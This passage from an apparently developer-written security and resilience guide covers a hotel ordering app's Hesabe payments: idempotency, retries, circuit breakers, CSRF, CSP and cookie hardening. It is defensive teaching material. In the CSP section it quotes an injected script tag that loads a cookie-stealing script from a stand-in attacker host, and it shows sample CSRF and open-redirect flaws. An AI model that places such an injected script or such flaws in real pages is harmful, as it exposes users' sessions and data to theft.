- [ ] Review Hesabe PCI certification

**Data Protection (GDPR/Kuwait)**:

- [ ] Create privacy policy
- [ ] Implement consent mechanism
- [ ] Data retention policy (90 days/7 years)
- [ ] Guest data rights process
- [ ] Data breach notification plan
- [ ] Minimize PII collection

**Audit Trails**:

- [ ] Implement immutable audit logs
- [ ] Backend-only writes (Admin SDK)
- [ ] Firestore security rules
- [ ] Log all payment events
- [ ] 7-year retention for financial records
- [ ] Archive old logs to cold storage
- [ ] Document query procedures

---

### 🎯 Compliance Priority Matrix

| Requirement              | Priority        | When          | Effort         | Cost |
| ------------------------ | --------------- | ------------- | -------------- | ---- |
| SAQ-A documentation      | ⚠️ **HIGH**     | Before prod   | 2-3 hours      | Free |
| Privacy policy           | ⚠️ **HIGH**     | Before launch | 1-2 hours      | Free |
| Guest consent UI         | ⚠️ **HIGH**     | Before launch | 2 hours        | Free |
| Audit log implementation | ⚠️ **CRITICAL** | Before prod   | 4-6 hours      | Free |
| Firestore security rules | ⚠️ **CRITICAL** | Before prod   | 1 hour         | Free |
| Quarterly PCI scans      | 💡 **MEDIUM**   | Ongoing       | 30 min/quarter | Free |
| Data deletion process    | 💡 **MEDIUM**   | Post-launch   | 2-3 hours      | Free |
| GDPR training (staff)    | 🔹 **LOW**      | Post-launch   | 1-2 hours      | Free |

---

### 📚 Compliance Resources

**PCI DSS**:

- Official SAQ-A: https://www.pcisecuritystandards.org/
- Hesabe PCI certification: (Request from Hesabe)
- Free scanner: https://www.ssllabs.com/ssltest/

**GDPR/Data Protection**:

- GDPR overview: https://gdpr.eu/
- Kuwait Data Protection Law: (Monitor for updates)
- Privacy policy generator: https://www.privacypolicies.com/

**Audit & Compliance**:

- Financial record retention: 7 years (Kuwait law)
- PCI compliance guide: https://www.pcisecuritystandards.org/

---

## 7. Resilience & Failover

### 🔑 Idempotency Keys (Prevent Duplicate Charges)

**What it is**: Ensure the same payment request, if retried, doesn't create duplicate charges.

**The Problem**:

```
Guest clicks "Pay" → Network timeout → They click again
Result: TWO charges for the same order! ❌
```

**The Solution**: Idempotency keys

---

### 💡 How Idempotency Works

**Concept**: Same request with same key = same result (no duplicate)

```
Request 1: order=123, key=abc123 → Charge created
Request 2: order=123, key=abc123 → Returns cached result (no new charge)
Request 3: order=456, key=xyz789 → New charge created
```

---

### ⚙️ Implementation with Hesabe

**Current Status**: ⚠️ Not implemented (risk of duplicate charges)

**Implementation**:

```javascript
// Generate idempotency key from order reference
const generateIdempotencyKey = (orderReference) => {
  // Use order reference as idempotency key
  // Each unique order gets unique key
  return `${orderReference}-${Date.now()}`;
};

// Store pending payment requests
const pendingPayments = new Map();

router.post("/payment/checkout", async (req, res) => {
  const { amount, orderReferenceNumber } = req.body;

  // Generate idempotency key
  const idempotencyKey = orderReferenceNumber; // Order ref is already unique

  // Check if this payment is already processing
  if (pendingPayments.has(idempotencyKey)) {
    const existingRequest = pendingPayments.get(idempotencyKey);

    // If still processing, return 409 Conflict
    if (existingRequest.status === "processing") {
      return res.status(409).json({
        success: false,
        error: "Payment already in progress",
        message: "Please wait for the current payment to complete",
      });
    }

    // If completed, return cached result
    if (existingRequest.status === "completed") {
      req.log("info", "Returning cached payment result", {
        orderRef: orderReferenceNumber,
        idempotencyKey,
      });

      return res.json(existingRequest.result);
    }
  }

  // Mark as processing
  pendingPayments.set(idempotencyKey, {
    status: "processing",
    startTime: Date.now(),
  });

  try {
    // Create Hesabe checkout
    const result = await hesabeService.createCheckout(req.body);

    // Cache successful result for 10 minutes
    pendingPayments.set(idempotencyKey, {
      status: "completed",
      result: { success: true, redirectUrl: result.redirectUrl },
      timestamp: Date.now(),
    });

    // Auto-cleanup after 10 minutes
    setTimeout(
      () => {
        pendingPayments.delete(idempotencyKey);
      },
      10 * 60 * 1000,
    );

    res.json({ success: true, redirectUrl: result.redirectUrl });
  } catch (error) {
    // Remove from pending on error (allow retry)
    pendingPayments.delete(idempotencyKey);

    req.log("error", "Payment creation failed", {
      orderRef: orderReferenceNumber,
      error: error.message,
    });

    res.status(500).json({
      success: false,
      error: "Payment creation failed",
    });
  }
});
```

---

### 🗄️ Database-Backed Idempotency (Production)

**Better Approach**: Store idempotency state in database (survives server restart)

```javascript
// Firestore-based idempotency
const checkIdempotency = async (idempotencyKey) => {
  const docRef = firestore.collection("idempotency_keys").doc(idempotencyKey);
  const doc = await docRef.get();

  if (doc.exists) {
    const data = doc.data();

    // Check if still valid (within 24 hours)
    const age = Date.now() - data.timestamp;
    if (age > 24 * 60 * 60 * 1000) {
      // Expired, delete and allow new request
      await docRef.delete();
      return null;
    }

    return data;
  }

  return null;
};

const storeIdempotency = async (idempotencyKey, result) => {
  await firestore
    .collection("idempotency_keys")
    .doc(idempotencyKey)
    .set({
      result,
      timestamp: Date.now(),
      expiresAt: Date.now() + 24 * 60 * 60 * 1000, // 24 hours
    });
};

// Usage
router.post("/payment/checkout", async (req, res) => {
  const idempotencyKey = req.body.orderReferenceNumber;

  // Check existing
  const existing = await checkIdempotency(idempotencyKey);
  if (existing) {
    req.log("info", "Idempotent request detected", { idempotencyKey });
    return res.json(existing.result);
  }

  // Process payment
  const result = await hesabeService.createCheckout(req.body);

  // Store result
  await storeIdempotency(idempotencyKey, {
    success: true,
    redirectUrl: result.redirectUrl,
  });

  res.json({ success: true, redirectUrl: result.redirectUrl });
});
```

---

### 🛡️ Graceful Degradation (Hesabe API Down)

**What it is**: Handle Hesabe API failures gracefully without breaking the user experience.

**Strategies**:

#### **Strategy 1: Fallback to Cash Payment**

```javascript
router.post("/payment/checkout", async (req, res) => {
  try {
    // Try Hesabe first
    const result = await hesabeService.createCheckout(req.body);
    return res.json({ success: true, redirectUrl: result.redirectUrl });
  } catch (error) {
    // Log the error
    req.log("error", "Hesabe API unavailable", {
      error: error.message,
      orderRef: req.body.orderReferenceNumber,
    });

    // Alert management
    await sendAlert("HIGH", "Hesabe Payment Gateway Down", {
      error: error.message,
      timestamp: new Date(),
    });

    // Fallback: Save order as "cash" payment
    return res.json({
      success: false,
      fallback: "cash",
      message:
        "Card payments temporarily unavailable. Please pay with cash on delivery.",
      orderSaved: true,
    });
  }
});
```

**Frontend Handling**:

```typescript
const result = await createHesabeCheckout(paymentData);

if (result.fallback === "cash") {
  // Show message to guest
  notify(
    "Card payments temporarily unavailable. Your order will be saved as cash payment.",
    "warning",
  );

  // Save order with cash payment method
  await placeOrder({
    ...orderData,
    paymentMethod: "cash",
    notes: "Card payment unavailable at time of order",
  });

  // Show confirmation
  navigate("/order-confirmed");
}
```

---

#### **Strategy 2: Queue for Later Processing**

```javascript
// Queue failed payments for retry
const queueFailedPayment = async (paymentData) => {
  await firestore.collection("payment_queue").add({
    ...paymentData,
    status: "queued",
    attempts: 0,
    createdAt: new Date(),
    nextRetry: new Date(Date.now() + 5 * 60 * 1000), // Retry in 5 minutes
  });
};

// Background job to process queued payments
const processPaymentQueue = async () => {
  const now = new Date();
  const queued = await firestore
    .collection("payment_queue")
    .where("status", "==", "queued")
    .where("nextRetry", "<=", now)
    .where("attempts", "<", 5) // Max 5 attempts
    .get();

  for (const doc of queued.docs) {
    const payment = doc.data();

    try {
      // Retry payment
      const result = await hesabeService.createCheckout(payment);

      // Success - notify guest
      await sendNotification(
        payment.phoneNumber,
        `Your payment link is ready: ${result.redirectUrl}`,
      );

      // Mark as processed
      await doc.ref.update({
        status: "processed",
        processedAt: new Date(),
      });
    } catch (error) {
      // Failed again - schedule next retry
      const attempts = payment.attempts + 1;
      const backoffMinutes = Math.pow(2, attempts) * 5; // Exponential backoff

      await doc.ref.update({
        attempts,
        lastError: error.message,
        nextRetry: new Date(Date.now() + backoffMinutes * 60 * 1000),
      });

      // If max attempts reached, mark as failed
      if (attempts >= 5) {
        await doc.ref.update({
          status: "failed",
          failedAt: new Date(),
        });

        // Alert management
        await sendAlert("HIGH", "Payment Failed After Retries", {
          orderRef: payment.orderReferenceNumber,
          attempts: 5,
        });
      }
    }
  }
};

// Run every 5 minutes
setInterval(processPaymentQueue, 5 * 60 * 1000);
```

---

### 🔄 Retry Policies with Exponential Backoff

**What it is**: Automatically retry failed requests with increasing delays.

**Why Important**:

- ✅ Handles transient network errors
- ✅ Reduces load on failing service
- ✅ Improves success rate

---

### 📊 Exponential Backoff Strategy

```
Attempt 1: Immediate
Attempt 2: Wait 1 second
Attempt 3: Wait 2 seconds
Attempt 4: Wait 4 seconds
Attempt 5: Wait 8 seconds
Attempt 6: Give up
```

**Implementation**:

```javascript
const retryWithBackoff = async (fn, maxRetries = 5, baseDelay = 1000) => {
  let lastError;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      // Try the function
      const result = await fn();

      // Success!
      if (attempt > 0) {
        console.log(`Succeeded on attempt ${attempt + 1}`);
      }

      return result;
    } catch (error) {
      lastError = error;

      // Check if error is retryable
      if (!isRetryableError(error)) {
        console.log("Non-retryable error, giving up");
        throw error;
      }

      // Last attempt - don't wait
      if (attempt === maxRetries - 1) {
        break;
      }

      // Calculate backoff delay (exponential + jitter)
      const exponentialDelay = baseDelay * Math.pow(2, attempt);
      const jitter = Math.random() * 1000; // Add randomness
      const delay = exponentialDelay + jitter;

      console.log(
        `Attempt ${attempt + 1} failed, retrying in ${Math.round(delay)}ms...`,
      );

      // Wait before retry
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }

  // All attempts failed
  console.error(`Failed after ${maxRetries} attempts`);
  throw lastError;
};

// Determine if error is retryable
const isRetryableError = (error) => {
  // Retry on network errors
  if (error.code === "ECONNRESET" || error.code === "ETIMEDOUT") {
    return true;
  }

  // Retry on 5xx server errors
  if (error.response && error.response.status >= 500) {
    return true;
  }

  // Retry on 429 (rate limit)
  if (error.response && error.response.status === 429) {
    return true;
  }

  // Don't retry on client errors (4xx)
  return false;
};

// Usage
router.post("/payment/checkout", async (req, res) => {
  try {
    const result = await retryWithBackoff(
      () => hesabeService.createCheckout(req.body),
      5, // max 5 retries
      1000, // 1 second base delay
    );

    res.json({ success: true, redirectUrl: result.redirectUrl });
  } catch (error) {
    req.log("error", "Payment failed after retries", {
      error: error.message,
    });

    res.status(500).json({
      success: false,
      error: "Payment service temporarily unavailable",
    });
  }
});
```

---

### 📦 Production-Ready Retry Library

**Use `axios-retry`** (battle-tested):

```javascript
const axios = require("axios");
const axiosRetry = require("axios-retry");

// Configure axios with retry
axiosRetry(axios, {
  retries: 5, // number of retries
  retryDelay: axiosRetry.exponentialDelay, // exponential backoff
  retryCondition: (error) => {
    // Retry on network errors or 5xx
    return (
      axiosRetry.isNetworkOrIdempotentRequestError(error) ||
      (error.response && error.response.status >= 500)
    );
  },
  onRetry: (retryCount, error, requestConfig) => {
    console.log(`Retry attempt ${retryCount} for ${requestConfig.url}`);
  },
});

// Usage in Hesabe service
const createCheckout = async (data) => {
  const response = await axios.post(
    `${HESABE_BASE_URL}/checkout`,
    encryptedData,
    {
      "axios-retry": {
        retries: 5,
        retryDelay: axiosRetry.exponentialDelay,
      },
    },
  );

  return response.data;
};
```

**Install**: `npm install axios-retry`

---

### ⏱️ Circuit Breaker Pattern

**What it is**: Stop trying if service is consistently failing (prevent cascading failures).

**States**:

```
CLOSED (normal) → API working, requests pass through
OPEN (failing) → API down, fail fast without trying
HALF-OPEN (testing) → Try one request to see if API recovered
```

**Implementation**:

```javascript
class CircuitBreaker {
  constructor(threshold = 5, timeout = 60000) {
    this.failureThreshold = threshold;
    this.timeout = timeout;
    this.failureCount = 0;
    this.lastFailureTime = null;
    this.state = "CLOSED"; // CLOSED, OPEN, HALF_OPEN
  }

  async execute(fn) {
    // If circuit is open, fail fast
    if (this.state === "OPEN") {
      // Check if timeout has passed
      if (Date.now() - this.lastFailureTime > this.timeout) {
        this.state = "HALF_OPEN";
        console.log("Circuit breaker: entering HALF_OPEN state");
      } else {
        throw new Error("Circuit breaker is OPEN - service unavailable");
      }
    }

    try {
      const result = await fn();

      // Success - reset or close circuit
      if (this.state === "HALF_OPEN") {
        console.log("Circuit breaker: service recovered, closing circuit");
        this.state = "CLOSED";
      }
      this.failureCount = 0;

      return result;
    } catch (error) {
      this.failureCount++;
      this.lastFailureTime = Date.now();

      // Open circuit if threshold exceeded
      if (this.failureCount >= this.failureThreshold) {
        this.state = "OPEN";
        console.warn(
          `Circuit breaker: OPENED after ${this.failureCount} failures`,
        );

        // Alert management
        await sendAlert("CRITICAL", "Circuit Breaker Opened", {
          service: "Hesabe",
          failures: this.failureCount,
          timestamp: new Date(),
        });
      }

      throw error;
    }
  }
}

// Create circuit breaker for Hesabe
const hesabeCircuit = new CircuitBreaker(
  5, // Open after 5 failures
  60000, // Try again after 60 seconds
);

// Usage
router.post("/payment/checkout", async (req, res) => {
  try {
    const result = await hesabeCircuit.execute(() =>
      hesabeService.createCheckout(req.body),
    );

    res.json({ success: true, redirectUrl: result.redirectUrl });
  } catch (error) {
    if (error.message.includes("Circuit breaker is OPEN")) {
      // Service is down, use fallback
      return res.json({
        success: false,
        fallback: "cash",
        message: "Card payments temporarily unavailable",
      });
    }

    throw error;
  }
});
```

---

### 🔔 Health Checks & Monitoring

**Check Hesabe API health before processing payments**:

```javascript
// Periodic health check
const checkHesabeHealth = async () => {
  try {
    // Simple ping to Hesabe API
    const response = await axios.get(
      `${HESABE_BASE_URL}/health`, // or any lightweight endpoint
      { timeout: 5000 },
    );

    if (response.status === 200) {
      return { healthy: true };
    }

    return { healthy: false, reason: `Status ${response.status}` };
  } catch (error) {
    return {
      healthy: false,
      reason: error.message,
    };
  }
};

// Run health check every minute
let hesabeHealthy = true;

setInterval(async () => {
  const health = await checkHesabeHealth();

  if (!health.healthy && hesabeHealthy) {
    // Just became unhealthy
    console.error("Hesabe API is down:", health.reason);
    await sendAlert("CRITICAL", "Hesabe API Down", {
      reason: health.reason,
      timestamp: new Date(),
    });
    hesabeHealthy = false;
  } else if (health.healthy && !hesabeHealthy) {
    // Just recovered
    console.log("Hesabe API recovered");
    await sendAlert("INFO", "Hesabe API Recovered", {
      timestamp: new Date(),
    });
    hesabeHealthy = true;
  }
}, 60 * 1000); // Every minute

// Expose health status
app.get("/health", (req, res) => {
  res.json({
    status: hesabeHealthy ? "healthy" : "degraded",
    hesabe: hesabeHealthy,
    timestamp: new Date(),
  });
});
```

---

### ✅ Resilience Checklist

**Idempotency**:

- [ ] Implement idempotency keys
- [ ] Use order reference as key
- [ ] Store state in database (not memory)
- [ ] Set expiration (24 hours)
- [ ] Test duplicate request handling

**Graceful Degradation**:

- [ ] Implement fallback to cash payment
- [ ] Queue failed payments for retry
- [ ] Display user-friendly error messages
- [ ] Alert management of failures

**Retry Policies**:

- [ ] Install `axios-retry`
- [ ] Configure exponential backoff
- [ ] Define retryable vs. non-retryable errors
- [ ] Set max retry attempts (5)
- [ ] Add jitter to prevent thundering herd

**Circuit Breaker**:

- [ ] Implement circuit breaker pattern
- [ ] Set failure threshold (5 failures)
- [ ] Set timeout (60 seconds)
- [ ] Add recovery testing (HALF_OPEN state)
- [ ] Alert when circuit opens

**Monitoring**:

- [ ] Health check endpoint
- [ ] Periodic Hesabe API health checks
- [ ] Alert on service degradation
- [ ] Track retry metrics
- [ ] Monitor circuit breaker state

---

### 🎯 Resilience Priority Matrix

| Feature               | Priority        | When        | Effort    | Cost |
| --------------------- | --------------- | ----------- | --------- | ---- |
| Idempotency keys      | ⚠️ **CRITICAL** | Before prod | 2-3 hours | Free |
| Exponential backoff   | ⚠️ **HIGH**     | Before prod | 1 hour    | Free |
| Error fallback (cash) | ⚠️ **HIGH**     | Before prod | 1 hour    | Free |
| Circuit breaker       | 💡 **MEDIUM**   | Post-launch | 2-3 hours | Free |
| Payment queue         | 💡 **MEDIUM**   | Post-launch | 3-4 hours | Free |
| Health checks         | 💡 **MEDIUM**   | Before prod | 1 hour    | Free |

**Total Effort (Critical + High)**: 4-5 hours
**Cost**: $0 (all free)

---

### 📚 Resilience Resources

**Libraries**:

- `axios-retry`: https://www.npmjs.com/package/axios-retry
- `opossum` (Circuit Breaker): https://www.npmjs.com/package/opossum
- `p-retry`: https://www.npmjs.com/package/p-retry

**Patterns**:

- Retry pattern: https://docs.microsoft.com/en-us/azure/architecture/patterns/retry
- Circuit breaker: https://martinfowler.com/bliki/CircuitBreaker.html
- Idempotency: https://stripe.com/docs/api/idempotent_requests

---

## 8. User-Facing Security

### 🛡️ CSRF Protection (Cross-Site Request Forgery)

**What it is**: Prevent malicious websites from making unauthorized requests to your backend using a guest's browser.

**The Attack**:

```
1. Guest logs into management app
2. Guest visits malicious site (evil.com)
3. evil.com makes request to YOUR backend using guest's cookies
4. Backend thinks it's legitimate (cookies included automatically)
Result: Unauthorized actions performed! ❌
```

---

### 🔒 CSRF Protection Implementation

**Current Status**: ⚠️ Not implemented (vulnerable to CSRF)

**Solution 1: CSRF Tokens** (Recommended for management app)

```javascript
const csrf = require("csurf");
const cookieParser = require("cookie-parser");

// Setup
app.use(cookieParser());
const csrfProtection = csrf({ cookie: true });

// Generate token for forms
app.get("/checkout-form", csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Verify token on submission
app.post("/payment/checkout", csrfProtection, async (req, res) => {
  // CSRF token automatically verified
  // If invalid, middleware returns 403
  // Process payment...
});
```

**Frontend (React)**:

```typescript
// Fetch CSRF token
const [csrfToken, setCsrfToken] = useState("");

useEffect(() => {
  fetch("/checkout-form")
    .then((res) => res.json())
    .then((data) => setCsrfToken(data.csrfToken));
}, []);

// Include in requests
const createPayment = async () => {
  await fetch("/payment/checkout", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "CSRF-Token": csrfToken, // Include token
    },
    body: JSON.stringify(paymentData),
  });
};
```

**Install**: `npm install csurf cookie-parser`

---

**Solution 2: SameSite Cookies** (Simpler, modern browsers)

```javascript
// Set SameSite attribute on cookies
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    cookie: {
      sameSite: "strict", // or 'lax'
      httpOnly: true,
      secure: process.env.NODE_ENV === "production", // HTTPS only
    },
  }),
);
```

**SameSite Values**:

- `strict`: Cookie never sent on cross-site requests (most secure, but breaks some flows)
- `lax`: Cookie sent on top-level navigation (e.g., clicking a link)
- `none`: Cookie sent everywhere (must use with `Secure`)

---

**Solution 3: Double Submit Cookie** (Stateless)

```javascript
const crypto = require("crypto");

// Generate CSRF token
const generateCsrfToken = () => {
  return crypto.randomBytes(32).toString("hex");
};

app.get("/checkout-form", (req, res) => {
  const csrfToken = generateCsrfToken();

  // Set cookie
  res.cookie("XSRF-TOKEN", csrfToken, {
    httpOnly: false, // Allow JavaScript to read
    sameSite: "strict",
  });

  // Also return in body
  res.json({ csrfToken });
});

// Verify token
const verifyCsrf = (req, res, next) => {
  const tokenFromHeader = req.headers["x-csrf-token"];
  const tokenFromCookie = req.cookies["XSRF-TOKEN"];

  if (!tokenFromHeader || tokenFromHeader !== tokenFromCookie) {
    return res.status(403).json({ error: "CSRF token mismatch" });
  }

  next();
};

app.post("/payment/checkout", verifyCsrf, async (req, res) => {
  // Process payment...
});
```

---

### 🎯 CSRF Protection Strategy for Your App

| App                            | CSRF Needed?      | Recommendation            |
| ------------------------------ | ----------------- | ------------------------- |
| **Menu App** (guest orders)    | ⚠️ **LOW**        | SameSite cookies          |
| **Management App** (staff)     | ⚠️ **HIGH**       | CSRF tokens + SameSite    |
| **API endpoints** (no session) | ✅ **NOT NEEDED** | No cookies = no CSRF risk |

**Why Menu App is low risk**:

- Guests don't have accounts/sessions
- No persistent authentication
- Room number is not sensitive
- Worst case: Someone places an order (not critical)

**Why Management App needs protection**:

- Staff have authenticated sessions
- Can modify orders, settings
- Higher privileges = higher risk

---

### 📋 Content Security Policy (CSP)

**What it is**: Tell browsers what resources (scripts, styles, images) are allowed to load, preventing XSS attacks.

**The Attack**:

```html
<!-- Attacker injects this -->
<script src="https://evil.com/steal-cookies.js"></script>

<!-- Without CSP: Script runs and steals data! ❌ -->
<!-- With CSP: Browser blocks foreign script ✅ -->
```

---

### 🛠️ CSP Implementation

**Current Status**: ⚠️ Not implemented (vulnerable to XSS)

**Basic CSP (Recommended)**:

```javascript
const helmet = require("helmet");

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"], // Only load resources from same origin
      scriptSrc: [
        "'self'",
        "'unsafe-inline'", // Allow inline scripts (use sparingly!)
        "https://apis.google.com", // Firebase
        "https://www.gstatic.com", // Firebase
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'", // Allow inline styles
        "https://fonts.googleapis.com",
      ],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: [
        "'self'",
        "data:", // Allow data URIs
        "https:", // Allow HTTPS images
      ],
      connectSrc: [
        "'self'",
        "https://seashell-backend.onrender.com", // Your API
        "https://api.hesabe.com", // Hesabe API
        "https://firebaseio.com", // Firebase
        "https://*.googleapis.com",
      ],
      frameSrc: [
        "https://payment.hesabe.com", // Hesabe payment iframe
      ],
    },
  }),
);
```

**Install**: `npm install helmet`

---

**Strict CSP (Best Security)**:

```javascript
// Use nonces for inline scripts
const crypto = require("crypto");

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        (req, res) => `'nonce-${res.locals.nonce}'`, // Dynamic nonce
      ],
      styleSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [], // Force HTTPS
    },
  }),
);
```

**HTML with nonce**:

```html
<!-- Server-rendered with nonce -->
<script nonce="<%= nonce %>">
  console.log("This script is allowed");
</script>

<!-- This script will be blocked (no nonce) -->
<script>
  console.log("This will NOT run");
</script>
```

---

### 📊 CSP Reporting

**Monitor CSP violations**:

```javascript
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // ... your directives
      reportUri: "/csp-violation-report",
    },
  }),
);

// Handle violation reports
app.post(
  "/csp-violation-report",
  express.json({ type: "application/csp-report" }),
  (req, res) => {
    console.log("CSP Violation:", req.body);

    // Log to monitoring service
    logger.warn("CSP violation detected", {
      blockedUri: req.body["csp-report"]?.["blocked-uri"],
      violatedDirective: req.body["csp-report"]?.["violated-directive"],
      documentUri: req.body["csp-report"]?.["document-uri"],
    });

    res.status(204).end();
  },
);
```

---

### 🍪 Secure Session Management

**What it is**: Properly configure cookies to prevent theft and hijacking.

**Cookie Flags**:

| Flag         | Purpose                   | Recommended                     |
| ------------ | ------------------------- | ------------------------------- |
| **HttpOnly** | Prevent JavaScript access | ✅ **YES** (prevents XSS theft) |
| **Secure**   | Only send over HTTPS      | ✅ **YES** (production)         |
| **SameSite** | Prevent CSRF              | ✅ **YES** (`lax` or `strict`)  |
| **Domain**   | Limit to specific domain  | ⚠️ **Optional**                 |
| **Path**     | Limit to specific path    | ⚠️ **Optional**                 |
| **Max-Age**  | Auto-expire               | ✅ **YES**                      |

---

### 🔐 Cookie Security Implementation

**Current Status**: ⚠️ Needs improvement

**Secure Cookie Configuration**:

```javascript
const session = require("express-session");
const FirestoreStore = require("firestore-store")(session);

app.use(
  session({
    store: new FirestoreStore({
      database: firestore,
    }),
    secret: process.env.SESSION_SECRET, // Strong random secret
    name: "seashell.sid", // Custom name (not "connect.sid")
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true, // ✅ Prevent JavaScript access
      secure: process.env.NODE_ENV === "production", // ✅ HTTPS only in prod
      sameSite: "lax", // ✅ CSRF protection
      maxAge: 24 * 60 * 60 * 1000, // 24 hours
      domain:
        process.env.NODE_ENV === "production" ? ".yourdomain.com" : undefined,
    },
  }),
);
```

---

### 🎫 JWT Token Security (Alternative to Sessions)

**If using JWTs** (for management app):

```javascript
const jwt = require("jsonwebtoken");

// Sign token
const generateToken = (user) => {
  return jwt.sign(
    {
      userId: user.id,
      role: user.role,
    },
    process.env.JWT_SECRET,
    {
      expiresIn: "24h",
      issuer: "seashell-hotel",
      audience: "seashell-api",
    },
  );
};

// Store in HttpOnly cookie (NOT localStorage!)
app.post("/auth/login", async (req, res) => {
  // Verify credentials...
  const user = await authenticateUser(req.body);

  const token = generateToken(user);

  res.cookie("auth_token", token, {
    httpOnly: true, // ❌ Can't be read by JavaScript
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge: 24 * 60 * 60 * 1000,
  });

  res.json({ success: true });
});

// Verify middleware
const verifyToken = (req, res, next) => {
  const token = req.cookies.auth_token;

  if (!token) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: "Invalid token" });
  }
};
```

**Why HttpOnly Cookies > localStorage**:

| Storage             | XSS Safe? | CSRF Safe?       | Recommendation  |
| ------------------- | --------- | ---------------- | --------------- |
| **HttpOnly Cookie** | ✅ YES    | ⚠️ Need SameSite | ✅ **USE THIS** |
| **localStorage**    | ❌ NO     | ✅ YES           | ❌ **AVOID**    |
| **sessionStorage**  | ❌ NO     | ✅ YES           | ❌ **AVOID**    |

**Why**: XSS can steal from localStorage, but NOT from HttpOnly cookies.

---

### 🔒 Session Fixation Prevention

**What it is**: Regenerate session ID after login to prevent hijacking.

```javascript
app.post("/auth/login", async (req, res) => {
  const user = await authenticateUser(req.body);

  if (user) {
    // Regenerate session ID after successful login
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).json({ error: "Login failed" });
      }

      // Set user info in new session
      req.session.userId = user.id;
      req.session.role = user.role;

      req.session.save((err) => {
        if (err) {
          return res.status(500).json({ error: "Login failed" });
        }

        res.json({ success: true });
      });
    });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});

// Destroy session on logout
app.post("/auth/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: "Logout failed" });
    }

    res.clearCookie("seashell.sid");
    res.json({ success: true });
  });
});
```

---

### 🌐 Additional Frontend Security Headers

**Use Helmet.js** for comprehensive security headers:

```javascript
const helmet = require("helmet");

// Apply all helmet protections
app.use(helmet());

// Or configure individually
app.use(helmet.hidePoweredBy()); // Remove X-Powered-By header
app.use(helmet.frameguard({ action: "deny" })); // Prevent clickjacking
app.use(helmet.xssFilter()); // Enable XSS filter
app.use(helmet.noSniff()); // Prevent MIME sniffing
app.use(helmet.ieNoOpen()); // IE, don't open downloads
app.use(
  helmet.hsts({
    // HSTS
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  }),
);
```

**Security Headers Applied**:

| Header                        | Purpose                   | Helmet Default     |
| ----------------------------- | ------------------------- | ------------------ |
| **X-Content-Type-Options**    | Prevent MIME sniffing     | `nosniff`          |
| **X-Frame-Options**           | Prevent clickjacking      | `DENY`             |
| **X-XSS-Protection**          | Enable browser XSS filter | `1; mode=block`    |
| **Strict-Transport-Security** | Force HTTPS               | `max-age=15552000` |
| **Content-Security-Policy**   | Prevent XSS/injection     | (see CSP section)  |
| **Referrer-Policy**           | Control referer header    | `no-referrer`      |

---

### 🎨 React-Specific Security

**Prevent XSS in React**:

```typescript
// ✅ SAFE - React escapes by default
<div>{userInput}</div>

// ❌ DANGEROUS - Bypasses escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ SAFE - Use sanitizer if HTML needed
import DOMPurify from 'dompurify';

const SafeHTML = ({ html }: { html: string }) => {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};
```

**Install**: `npm install dompurify @types/dompurify`

---

**Prevent Open Redirects**:

```typescript
// ❌ DANGEROUS
const returnUrl = new URLSearchParams(window.location.search).get("return");
window.location.href = returnUrl; // Could redirect to evil.com!

// ✅ SAFE - Whitelist allowed URLs
const ALLOWED_REDIRECTS = ["/orders", "/menu", "/checkout"];

const safeRedirect = (url: string) => {
  if (ALLOWED_REDIRECTS.includes(url)) {
    window.location.href = url;
  } else {
    window.location.href = "/"; // Default safe page
  }
};
```

---

### ✅ User-Facing Security Checklist

**CSRF Protection**:

- [ ] Install `csurf` for management app
- [ ] Generate CSRF tokens for forms
- [ ] Verify tokens on POST requests
- [ ] Set `SameSite` cookies
- [ ] Test CSRF protection

**Content Security Policy**:

- [ ] Install `helmet`
- [ ] Configure CSP directives
- [ ] Test with your app (may need adjustments)
- [ ] Set up CSP violation reporting
- [ ] Monitor reports and fix violations

**Secure Cookies/Sessions**:

- [ ] Set `HttpOnly` flag
- [ ] Set `Secure` flag (production)
- [ ] Set `SameSite` attribute
- [ ] Use strong session secret
- [ ] Regenerate session on login
- [ ] Destroy session on logout
- [ ] Set reasonable `maxAge`

**Additional Headers**:

- [ ] Apply helmet.js defaults
- [ ] Configure `X-Frame-Options`
- [ ] Enable XSS filter
- [ ] Prevent MIME sniffing
- [ ] Set Referrer-Policy

**React Security**:

- [ ] Never use `dangerouslySetInnerHTML` without sanitization
- [ ] Install DOMPurify if HTML rendering needed
- [ ] Validate all redirects
- [ ] Sanitize user input before display

---

### 🎯 User-Facing Security Priority Matrix

| Feature                | Priority        | When        | Effort    | Cost |
| ---------------------- | --------------- | ----------- | --------- | ---- |
| Helmet.js (headers)    | ⚠️ **CRITICAL** | Before prod | 30 min    | Free |
| HttpOnly cookies       | ⚠️ **CRITICAL** | Before prod | 30 min    | Free |
| CSP (basic)            | ⚠️ **HIGH**     | Before prod | 1-2 hours | Free |
| CSRF tokens (mgmt app) | ⚠️ **HIGH**     | Before prod | 1-2 hours | Free |
| SameSite cookies       | ⚠️ **HIGH**     | Before prod | 15 min    | Free |
| Session regeneration   | 💡 **MEDIUM**   | Before prod | 30 min    | Free |
| CSP reporting          | 💡 **MEDIUM**   | Post-launch | 1 hour    | Free |
